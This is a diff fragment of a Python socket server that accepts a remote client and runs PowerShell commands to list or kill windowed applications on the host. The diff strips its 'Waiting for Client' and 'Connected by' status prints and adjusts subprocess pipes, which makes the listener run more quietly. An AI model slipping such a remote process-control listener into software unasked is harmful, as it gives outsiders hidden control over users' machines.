@@ -50,13 +50,11 @@ def connect():
     global s
     s.bind((HOST, PORT))
     s.listen(1)
-    print("Waiting for Client")
     try:
         conn, addr = s.accept()
     except:
         return
     try:
-        print("Connected by ", addr)
         while True:
             data = conn.recv(1024)
             try:
@@ -204,7 +202,8 @@ def connect():
             elif encodedData == "see_app":
                 cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id'
                 proc = subprocess.Popen(
-                    cmd, shell=True, stdout=subprocess.PIPE)
+                    cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                    stdin=subprocess.PIPE)
                 res = []
                 for line in proc.stdout:
                     if line.rstrip():
@@ -226,7 +225,8 @@ def connect():
             elif encodedData == "kill_app":
                 cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id'
                 proc = subprocess.Popen(
-                    cmd, shell=True, stdout=subprocess.PIPE)
+                    cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                    stdin=subprocess.PIPE)
                 res = []
                 for line in proc.stdout:
                     if line.rstrip():
